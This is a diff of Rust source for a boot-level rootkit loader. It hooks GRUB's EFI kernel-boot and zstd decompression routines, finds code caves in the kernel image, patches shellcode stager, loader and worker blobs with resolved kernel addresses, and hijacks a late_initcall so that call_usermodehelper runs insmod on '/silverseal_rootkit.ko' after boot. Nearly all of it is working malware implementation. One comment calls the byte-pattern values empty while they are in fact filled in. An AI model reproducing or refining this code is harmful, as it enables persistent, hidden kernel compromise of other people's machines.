@@ -1,7 +1,7 @@
 use log::{debug, error, info};
 
 use crate::helpers::{
-    file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_after},
+    file_helper::{cave_finder_by_section_name, get_section_address_by_name, cave_finder_by_section_name_after},
     memory_helper::{
         INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
         get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
@@ -21,25 +21,44 @@ pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
     original_bytes: [0; INLINE_HOOK_SIZE],
 };
 
-const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
-const REQUEST_MODULE_DISTANCE: u8 = 0x45;
+// ── Kernel function patterns (fill with target-kernel byte sequences) ─────────
+// Each PATTERN identifies a unique byte sequence within the function body;
+// DISTANCE is the byte count to subtract from the match address to reach the
+// function entry point.  Values are left empty until extracted from a target
+// kernel binary.
+const QUEUE_DELAYED_WORK_PATTERN: &[u8] = &[0x41, 0x54, 0x4C, 0x8D, 0x62, 0x20];
+const QUEUE_DELAYED_WORK_DISTANCE: u8 = 9;
+const CALL_USERMODEHELPER_PATTERN: &[u8] = &[0x81, 0xC6, 0xC0, 0x0D, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x3C];
+const CALL_USERMODEHELPER_DISTANCE: u8 = 0x40;
+// system_wq is a kernel global (struct workqueue_struct *).  PATTERN matches
+// unique bytes near the MOV instruction that loads it in a known caller;
+// DISTANCE backs up to the start of that instruction
+// (opcode sequence: 48 8B 3D xx xx xx xx — MOV RDI, [RIP+disp32]).
+// Rust reads the embedded disp32 to derive system_wq's virtual address.
+const SYSTEM_WQ_OFFSET: u32 = 0x83a9b0;
+// const SYSTEM_WQ_PATTERN: &[u8] = &[];             // TODO: extract from target kernel
+// const SYSTEM_WQ_DISTANCE: u8 = 0;                 // TODO: offset back to MOV start
+const DELAYED_WORK_TIMER_FN_PATTERN: &[u8] = &[0x55, 0x48, 0x8D, 0x57, 0xE0];
+const DELAYED_WORK_TIMER_FN_DISTANCE: u8 = 5;
+
+// ── Stager sentinels (unchanged) ─────────────────────────────────────────────
 const SET_MEMORY_X_PATTERN: &[u8] = &[0x31, 0xC0, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x08];
 const SET_MEMORY_X_DISTANCE: u8 = 6;
 const CAVE_PAGE_DISP_SENTINEL: u32 = 0x11223344;
 const SET_MEMORY_X_REL_SENTINEL: u32 = 0x55667788;
 const LOADER_JMP_REL_SENTINEL: u32 = 0x99AABBCC;
-const REQUEST_MODULE_REL_SENTINEL: u32 = 0xDDEEFF00;
+
+// ── Loader sentinels ──────────────────────────────────────────────────────────
 const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
-const SCHEDULE_WORK_PATTERN: &[u8] = &[0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00];
-const SCHEDULE_WORK_DISTANCE: u8 = 8;
-const MSLEEP_PATTERN: &[u8] = &[0x48, 0x89, 0xC3, 0x66, 0x90, 0x41, 0xC7, 0x44, 0x24, 0x18, 0x02];
-const MSLEEP_DISTANCE: u8 = 0x1E;
-const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
-const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
-const LKM_WORKER_REL_SENTINEL: u32 = 0xFEDCBA98;
-const WORKER_RESUME_SENTINEL: u32 = 0x11EEDDFF;
-// Offset of lkm_worker from the start of the loader blob (set by align 128 in lkm_loader.asm).
-const LKM_WORKER_IN_LOADER_OFFSET: usize = 128;
+const LKM_WORKER_CAVE_SENTINEL: u32 = 0x11EEDDFF;
+const TIMER_FN_DISP_SENTINEL: u32 = 0xBBCCDDEE;
+const SYSTEM_WQ_DISP_SENTINEL: u32 = 0xCCDDEEFF;
+const QUEUE_DELAYED_WORK_REL_SENTINEL: u32 = 0x33445566;
+
+// ── lkm_worker sentinels ──────────────────────────────────────────────────────
+const INSMOD_PATH_DISP_SENTINEL: u32 = 0xFEDCBA98;
+const ARGV_DATA_DISP_SENTINEL: u32 = 0x98BADCFE;
+const CALL_USERMODEHELPER_REL_SENTINEL: u32 = 0x77889900;
 
 /// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
 /// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
@@ -197,8 +216,8 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     );
 
     // Deploy the kernel hook: overwrite the late_initcall slot to point at our
-    // shellcode in the code cave, which calls __request_module then tail-calls
-    // the original initcall target.
+    // shellcode in the code cave, which calls queue_delayed_work to schedule
+    // the rootkit load, then tail-calls the original initcall target.
     let initcall_info =
         match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
             Some(info) => info,
@@ -214,17 +233,19 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         initcall_info.original_target_virtual_address
     );
 
-    // Stage 1 — stager lives in .text (always RX): makes .data cave executable, jumps to loader.
-    // Stage 2 — loader lives in .data: initialises work_struct, calls schedule_work.
-    // Stage 3 — worker_resume lives in .text (always RX): re-enables .data execution, jumps to lkm_worker.
-    // Stage 4 — lkm_worker lives in .data (inside loader blob at offset LKM_WORKER_IN_LOADER_OFFSET).
-    //            mark_readonly() re-applies NX to .data after initcalls; worker_resume fixes this.
+    // Stage 1 — stager lives in .text (always RX): makes .data cave executable,
+    //           jumps to loader.
+    // Stage 2 — loader lives in .data: initialises delayed_work with
+    //           work.func = &lkm_worker (.text), calls queue_delayed_work,
+    //           tail-calls original initcall.
+    // Stage 3 — lkm_worker lives in .text (always RX): fires ~10 s after boot,
+    //           calls call_usermodehelper to load the rootkit via insmod.
     const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
     const STAGER_LEN: usize = STAGER_TEMPLATE.len();
     const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
     const LOADER_LEN: usize = LOADER_TEMPLATE.len();
-    const WORKER_RESUME_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_RESUME_BIN"));
-    const WORKER_RESUME_LEN: usize = WORKER_RESUME_TEMPLATE.len();
+    const LKM_WORKER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_BIN"));
+    const LKM_WORKER_LEN: usize = LKM_WORKER_TEMPLATE.len();
 
     // Find stager cave in .text.
     let stager_cave = match cave_finder_by_section_name(dst, dst_capacity, STAGER_LEN, ".text") {
@@ -236,21 +257,21 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     };
     debug!("Stager cave: phys={:#x}", stager_cave);
 
-    // Find worker_resume cave in .text — must be after the stager cave.
-    let worker_resume_cave = match cave_finder_by_section_name_after(
+    // Find lkm_worker cave in .text — must be after the stager cave.
+    let lkm_worker_cave = match cave_finder_by_section_name_after(
         dst,
         dst_capacity,
-        WORKER_RESUME_LEN,
+        LKM_WORKER_LEN,
         ".text",
         stager_cave + STAGER_LEN,
     ) {
         Some(addr) => addr,
         None => {
-            error!("Failed to find worker_resume cave in .text");
+            error!("Failed to find lkm_worker cave in .text");
             return ret_val;
         }
     };
-    debug!("Worker resume cave: phys={:#x}", worker_resume_cave);
+    debug!("lkm_worker cave: phys={:#x}", lkm_worker_cave);
 
     // Find loader cave in .data.
     let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
@@ -262,29 +283,7 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     };
     debug!("Loader cave: phys={:#x}", loader_cave);
 
-    // Find __request_module via byte pattern.
-    let mut request_module_phys = match binary_search(dst, dst_capacity, REQUEST_MODULE_PATTERN) {
-        Some(addr) => addr,
-        None => {
-            error!("Failed to find __request_module in kernel");
-            return ret_val;
-        }
-    };
-    request_module_phys -= REQUEST_MODULE_DISTANCE as usize;
-    let request_module_virt =
-        match translate_physical_to_virtual(dst, dst_capacity, request_module_phys) {
-            Some(addr) => addr,
-            None => {
-                error!("Failed to translate __request_module to virtual address");
-                return ret_val;
-            }
-        };
-    debug!(
-        "__request_module: phys={:#x}, virt={:#x}",
-        request_module_phys, request_module_virt
-    );
-
-    // Find set_memory_x via __ksymtab.
+    // Find set_memory_x via byte pattern.
     let mut set_memory_x_phys = match binary_search(dst, dst_capacity, SET_MEMORY_X_PATTERN) {
         Some(addr) => addr,
         None => {
@@ -305,48 +304,82 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         set_memory_x_phys, set_memory_x_virt
     );
 
-    // Find schedule_work via byte pattern.
-    let mut schedule_work_phys =
-        match binary_search(dst, dst_capacity, SCHEDULE_WORK_PATTERN) {
+    // Find queue_delayed_work via byte pattern.
+    let mut queue_delayed_work_phys =
+        match binary_search(dst, dst_capacity, QUEUE_DELAYED_WORK_PATTERN) {
             Some(addr) => addr,
             None => {
-                error!("Failed to find schedule_work in kernel");
+                error!("Failed to find queue_delayed_work in kernel");
                 return ret_val;
             }
         };
-    schedule_work_phys -= SCHEDULE_WORK_DISTANCE as usize;
-    let schedule_work_virt =
-        match translate_physical_to_virtual(dst, dst_capacity, schedule_work_phys) {
+    queue_delayed_work_phys -= QUEUE_DELAYED_WORK_DISTANCE as usize;
+    let queue_delayed_work_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, queue_delayed_work_phys) {
             Some(addr) => addr,
             None => {
-                error!("Failed to translate schedule_work to virtual address");
+                error!("Failed to translate queue_delayed_work to virtual address");
                 return ret_val;
             }
         };
     debug!(
-        "schedule_work: phys={:#x}, virt={:#x}",
-        schedule_work_phys, schedule_work_virt
+        "queue_delayed_work: phys={:#x}, virt={:#x}",
+        queue_delayed_work_phys, queue_delayed_work_virt
     );
 
-    // Find msleep via byte pattern.
-    let mut msleep_phys = match binary_search(dst, dst_capacity, MSLEEP_PATTERN) {
-        Some(addr) => addr,
+    // Find call_usermodehelper via byte pattern.
+    let mut call_usermodehelper_phys =
+        match binary_search(dst, dst_capacity, CALL_USERMODEHELPER_PATTERN) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to find call_usermodehelper in kernel");
+                return ret_val;
+            }
+        };
+    call_usermodehelper_phys -= CALL_USERMODEHELPER_DISTANCE as usize;
+    let call_usermodehelper_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, call_usermodehelper_phys) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to translate call_usermodehelper to virtual address");
+                return ret_val;
+            }
+        };
+    debug!(
+        "call_usermodehelper: phys={:#x}, virt={:#x}",
+        call_usermodehelper_phys, call_usermodehelper_virt
+    );
+
+    let rodata_virt = match get_section_address_by_name(dst, dst_capacity, ".rodata") {
+        Some(sec) => sec,
         None => {
-            error!("Failed to find msleep in kernel");
+            error!("Failed to find .rodata section in kernel");
             return ret_val;
         }
     };
-    msleep_phys -= MSLEEP_DISTANCE as usize;
-    let msleep_virt = match translate_physical_to_virtual(dst, dst_capacity, msleep_phys) {
+    let system_wq_virt = rodata_virt + SYSTEM_WQ_OFFSET as usize;
+    debug!(".rodata section: virt={:#x}, system_wq: virt={:#x}", rodata_virt, system_wq_virt);
+
+    // Find delayed_work_timer_fn via byte pattern.
+    let mut dtimerfn_phys =
+        match binary_search(dst, dst_capacity, DELAYED_WORK_TIMER_FN_PATTERN) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to find delayed_work_timer_fn in kernel");
+                return ret_val;
+            }
+        };
+    dtimerfn_phys -= DELAYED_WORK_TIMER_FN_DISTANCE as usize;
+    let dtimerfn_virt = match translate_physical_to_virtual(dst, dst_capacity, dtimerfn_phys) {
         Some(addr) => addr,
         None => {
-            error!("Failed to translate msleep to virtual address");
+            error!("Failed to translate delayed_work_timer_fn to virtual address");
             return ret_val;
         }
     };
     debug!(
-        "msleep: phys={:#x}, virt={:#x}",
-        msleep_phys, msleep_virt
+        "delayed_work_timer_fn: phys={:#x}, virt={:#x}",
+        dtimerfn_phys, dtimerfn_virt
     );
 
     let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
@@ -361,17 +394,17 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         stager_cave, stager_cave_virt
     );
 
-    let worker_resume_cave_virt =
-        match translate_physical_to_virtual(dst, dst_capacity, worker_resume_cave) {
+    let lkm_worker_cave_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, lkm_worker_cave) {
             Some(addr) => addr,
             None => {
-                error!("Failed to translate worker_resume cave to virtual address");
+                error!("Failed to translate lkm_worker cave to virtual address");
                 return ret_val;
             }
         };
     debug!(
-        "Worker resume cave: phys={:#x}, virt={:#x}",
-        worker_resume_cave, worker_resume_cave_virt
+        "lkm_worker cave: phys={:#x}, virt={:#x}",
+        lkm_worker_cave, lkm_worker_cave_virt
     );
 
     let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
@@ -385,9 +418,6 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         "Loader cave: phys={:#x}, virt={:#x}",
         loader_cave, loader_cave_virt
     );
-
-    // lkm_worker is at a fixed offset inside the loader blob (set by align 128 in lkm_loader.asm).
-    let lkm_worker_virt = loader_cave_virt + LKM_WORKER_IN_LOADER_OFFSET;
 
     // ── Patch stager blob ──────────────────────────────────────────────────────
     let mut stager = [0u8; STAGER_LEN];
@@ -437,16 +467,107 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     let mut loader = [0u8; LOADER_LEN];
     loader.copy_from_slice(LOADER_TEMPLATE);
 
-    let sentinel = REQUEST_MODULE_REL_SENTINEL.to_le_bytes();
+    // Pre-build argv_data in the loader blob.
+    // Scan the blob for the known path strings to compute their virtual addresses,
+    // then write the pointer values so lkm_worker can read them at call time.
+    let insmod_path_offset =
+        match loader.windows(13).position(|w| w == b"/sbin/insmod\0") {
+            Some(off) => off,
+            None => {
+                error!("Failed to find insmod_path in loader blob");
+                return ret_val;
+            }
+        };
+    let path_buffer_offset =
+        match loader.windows(23).position(|w| w == b"/silverseal_rootkit.ko\0") {
+            Some(off) => off,
+            None => {
+                error!("Failed to find path_buffer in loader blob");
+                return ret_val;
+            }
+        };
+    // argv_data immediately follows insmod_path (13 bytes: "/sbin/insmod\0")
+    let argv_data_offset = insmod_path_offset + 13;
+    let insmod_path_virt = loader_cave_virt + insmod_path_offset;
+    let path_buffer_virt = loader_cave_virt + path_buffer_offset;
+    let argv_data_virt = loader_cave_virt + argv_data_offset;
+    loader[argv_data_offset..argv_data_offset + 8]
+        .copy_from_slice(&(insmod_path_virt as u64).to_le_bytes());
+    loader[argv_data_offset + 8..argv_data_offset + 16]
+        .copy_from_slice(&(path_buffer_virt as u64).to_le_bytes());
+    // argv_data[16] stays zero (NULL terminator, already zeroed in blob template)
+    debug!(
+        "argv pre-built: argv[0]={:#x} argv[1]={:#x}",
+        insmod_path_virt, path_buffer_virt
+    );
+
+    // LKM_WORKER_CAVE_SENTINEL: disp32 in `lea rax, [rip+d]` → lkm_worker_cave_virt
+    let sentinel = LKM_WORKER_CAVE_SENTINEL.to_le_bytes();
     if let Some(off) = find_sentinel_4(&loader, &sentinel) {
-        let rel32 = (request_module_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        let disp32 =
+            (lkm_worker_cave_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!(
+                "lkm_worker cave too far from loader for disp32: delta={:#x}",
+                disp32
+            );
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find LKM_WORKER_CAVE_SENTINEL in loader");
+        return ret_val;
+    }
+
+    // TIMER_FN_DISP_SENTINEL: disp32 in `lea rax, [rip+d]` → delayed_work_timer_fn
+    let sentinel = TIMER_FN_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let disp32 = (dtimerfn_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!(
+                "delayed_work_timer_fn too far from loader cave for disp32: delta={:#x}",
+                disp32
+            );
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find TIMER_FN_DISP_SENTINEL in loader");
+        return ret_val;
+    }
+
+    // SYSTEM_WQ_DISP_SENTINEL: disp32 in `mov rdi, [rip+d]` → system_wq global
+    let sentinel = SYSTEM_WQ_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let disp32 = (system_wq_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!(
+                "system_wq too far from loader cave for disp32: delta={:#x}",
+                disp32
+            );
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find SYSTEM_WQ_DISP_SENTINEL in loader");
+        return ret_val;
+    }
+
+    // QUEUE_DELAYED_WORK_REL_SENTINEL: rel32 for call queue_delayed_work
+    let sentinel = QUEUE_DELAYED_WORK_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let rel32 =
+            (queue_delayed_work_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
         if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
-            error!("__request_module too far from loader cave for rel32: delta={:#x}", rel32);
+            error!(
+                "queue_delayed_work too far from loader cave for rel32: delta={:#x}",
+                rel32
+            );
             return ret_val;
         }
         loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find REQUEST_MODULE_REL_SENTINEL in loader");
+        error!("Failed to find QUEUE_DELAYED_WORK_REL_SENTINEL in loader");
         return ret_val;
     }
 
@@ -464,114 +585,60 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         return ret_val;
     }
 
-    // ── Patch loader blob ──────────────────────────────────────────────────────
-    let sentinel = SCHEDULE_WORK_REL_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
-        let rel32 =
-            (schedule_work_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
-        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
-            error!(
-                "schedule_work too far from loader cave for rel32: delta={:#x}",
-                rel32
-            );
-            return ret_val;
-        }
-        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
-    } else {
-        error!("Failed to find SCHEDULE_WORK_REL_SENTINEL in loader");
-        return ret_val;
-    }
+    // ── Patch lkm_worker blob ──────────────────────────────────────────────────
+    let mut lkm_worker = [0u8; LKM_WORKER_LEN];
+    lkm_worker.copy_from_slice(LKM_WORKER_TEMPLATE);
 
-    let sentinel = MSLEEP_REL_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
-        let rel32 = (msleep_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
-        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
-            error!(
-                "msleep too far from loader cave for rel32: delta={:#x}",
-                rel32
-            );
-            return ret_val;
-        }
-        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
-    } else {
-        error!("Failed to find MSLEEP_REL_SENTINEL in loader");
-        return ret_val;
-    }
-
-    // WORKER_RESUME_SENTINEL: disp32 in `lea rax, [rip + disp32]` — points to
-    // lkm_worker_resume in .text so that work.func runs from an always-executable page.
-    let sentinel = WORKER_RESUME_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+    // INSMOD_PATH_DISP_SENTINEL: disp32 in `lea rdi,[rip+d]` → insmod_path
+    let sentinel = INSMOD_PATH_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&lkm_worker, &sentinel) {
         let disp32 =
-            (worker_resume_cave_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+            (insmod_path_virt as i64) - (lkm_worker_cave_virt as i64 + off as i64 + 4);
         if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
             error!(
-                "worker_resume cave too far from loader for disp32: delta={:#x}",
+                "insmod_path too far from lkm_worker cave for disp32: delta={:#x}",
                 disp32
             );
             return ret_val;
         }
-        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+        lkm_worker[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find WORKER_RESUME_SENTINEL in loader");
+        error!("Failed to find INSMOD_PATH_DISP_SENTINEL in lkm_worker");
         return ret_val;
     }
 
-    // ── Patch worker_resume blob ───────────────────────────────────────────────
-    let mut worker_resume = [0u8; WORKER_RESUME_LEN];
-    worker_resume.copy_from_slice(WORKER_RESUME_TEMPLATE);
-
-    // CAVE_PAGE_DISP_SENTINEL: disp32 in lea rdi,[rip+d] → loader_cave_virt
-    let sentinel = CAVE_PAGE_DISP_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
-        let disp32 =
-            (loader_cave_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
+    // ARGV_DATA_DISP_SENTINEL: disp32 in `lea rsi,[rip+d]` → argv_data
+    let sentinel = ARGV_DATA_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&lkm_worker, &sentinel) {
+        let disp32 = (argv_data_virt as i64) - (lkm_worker_cave_virt as i64 + off as i64 + 4);
         if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
             error!(
-                "Loader cave too far from worker_resume for disp32: delta={:#x}",
+                "argv_data too far from lkm_worker cave for disp32: delta={:#x}",
                 disp32
             );
             return ret_val;
         }
-        worker_resume[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+        lkm_worker[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find CAVE_PAGE_DISP_SENTINEL in worker_resume");
+        error!("Failed to find ARGV_DATA_DISP_SENTINEL in lkm_worker");
         return ret_val;
     }
 
-    // SET_MEMORY_X_REL_SENTINEL: rel32 for call set_memory_x
-    let sentinel = SET_MEMORY_X_REL_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
+    // CALL_USERMODEHELPER_REL_SENTINEL: rel32 for call call_usermodehelper
+    let sentinel = CALL_USERMODEHELPER_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&lkm_worker, &sentinel) {
         let rel32 =
-            (set_memory_x_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
+            (call_usermodehelper_virt as i64) - (lkm_worker_cave_virt as i64 + off as i64 + 4);
         if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
             error!(
-                "set_memory_x too far from worker_resume for rel32: delta={:#x}",
+                "call_usermodehelper too far from lkm_worker cave for rel32: delta={:#x}",
                 rel32
             );
             return ret_val;
         }
-        worker_resume[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
+        lkm_worker[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find SET_MEMORY_X_REL_SENTINEL in worker_resume");
-        return ret_val;
-    }
-
-    // LKM_WORKER_REL_SENTINEL: rel32 for jmp lkm_worker in .data
-    let sentinel = LKM_WORKER_REL_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
-        let rel32 =
-            (lkm_worker_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
-        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
-            error!(
-                "lkm_worker too far from worker_resume for rel32: delta={:#x}",
-                rel32
-            );
-            return ret_val;
-        }
-        worker_resume[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
-    } else {
-        error!("Failed to find LKM_WORKER_REL_SENTINEL in worker_resume");
+        error!("Failed to find CALL_USERMODEHELPER_REL_SENTINEL in lkm_worker");
         return ret_val;
     }
 
@@ -580,14 +647,14 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
         core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
         core::ptr::copy_nonoverlapping(
-            worker_resume.as_ptr(),
-            worker_resume_cave as *mut u8,
-            WORKER_RESUME_LEN,
+            lkm_worker.as_ptr(),
+            lkm_worker_cave as *mut u8,
+            LKM_WORKER_LEN,
         );
     }
     debug!(
-        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}, {} bytes of worker_resume to {:#x}",
-        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave, WORKER_RESUME_LEN, worker_resume_cave
+        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}, {} bytes of lkm_worker to {:#x}",
+        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave, LKM_WORKER_LEN, lkm_worker_cave
     );
 
     // ── Patch initcall slot (prel32) to point at the stager ────────────────────
